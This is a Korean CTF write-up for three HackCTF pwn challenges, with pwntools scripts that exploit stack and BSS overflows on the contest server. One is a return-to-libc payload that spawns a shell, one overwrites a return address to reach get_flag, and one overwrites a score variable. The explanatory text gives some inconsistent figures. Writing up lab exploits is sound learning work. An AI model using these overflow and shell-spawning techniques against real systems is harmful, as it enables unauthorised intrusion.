# HACKCTF 
## RTL_World  
~~~python
from pwn import *
r = remote("ctf.j0n9hyun.xyz",3010)
system=0x080485b0
binsh=0x8048eb1

r.recv(1024)
r.sendline("5")
r.recvuntil("[Attack] > ")
payload = 'A'*144+p32(system)+'A'*4+p32(binsh)
r.sendline(payload)
r.interactive()
~~~
우선 nc를 통해 실행시켜봤더니 엄청 복잡하다.
우선 입력할 수 있는 부분을 먼저 찾으니 선택부분과 5번 kill 부분에서 입력 가능하다.
case 5에서는 read 함수로 buf에 입력을 받음으로 여기서 공격이 가능하다.
또한 아이다에서 system 함수의 주소를 얻었다.
system 함수의 인자로 사용될 bin/sh값을 objdump | grep /bin/sh 함수로 찾아준다.
이제 payload를 dummy(144) | system 주소 | ret(4) | binsh 주소 이렇게 구성시켜주면
shell을 얻을 수 있다. 롸이트업을 계속 보고 하게 된다ㅠㅠ
## g++ pwn
~~~python
from pwn import *
r = remote("ctf.j0n9hyun.xyz",3011)
flag=0x08048f0d
payload = 'A'*4 + 'I'*20+p32(flag)
r.sendline(payload)
r.interactive()
~~~
ida를 통해 열어보니 메인 함수에는 vuln 함수만 포함되어 있다. 그리고 get_flag라는 함수의 존재를 알 수 있다.
flag는 이 함수를 통해 얻는다고 예상했다. vuln 함수의 경우에 fgets 함수로 32개를 받으므로 ret까지 도달하지 못하게 되어있다. 
어떻게 풀어야할지 감이 안 잡혀서 wirteup을 보니 replace함수를 이용해야 한다. 
replace 함수는 "I"를 "YOU"로 대체하는데 dummy의 크기를 3배 늘려 버퍼에 복사가능하도록 해준다. 
따라서 dummy 값으로 "I"를 사용하고 ret에는 get_flag의 주소를 집어넣으면 flag를 얻을 수 있다. 
## poet
~~~python
from pwn import *

r=remote("ctf.j0n9hyun.xyz",3012)
point = 999900
payload='A'*64+p32(point)
r.recvuntil("> ")
r.sendline("eat")
r.recvuntil("> ")
r.sendline(payload)

r.interactive()
~~~
푸는 방법이 특이한 문제이다. 개인적으로 lob보다 더 취향에 맞는 거 같다.
nc를 통해 실행시켜보면 enter 부분과 저자 두 부분에 입력이 가능하다.
그리고 점수가 10000이 넘어가게 되면 reward()함수를 통해 flag를 주어진다고 밝혀져있다. 
get_poem에서 unk_6024A0라는 변수가 BSS 영역에 있는 것을 알 수 있다.
unk_6024a0의 주소는 0x6024a0d이다. 이 문제는 점수를  1000000으로 만들어서 flag를 얻어야 한다. 
따라서 문제의 양식에 따라 100점을 얻어주고 point를 999900으로 만들어서 합 1000000을 flag를 얻어낸다. 
점수를 의미하는 변수 dword_6024e0와 0x6024a0의 거리차는 64이므로 
0x6024a0에 64개의 dummy 값과 999900 을 넣어주면 flag가 주어진다.

## 1996
**풀지 못했습니다**
## Random Key
**풀지 못했습니다**
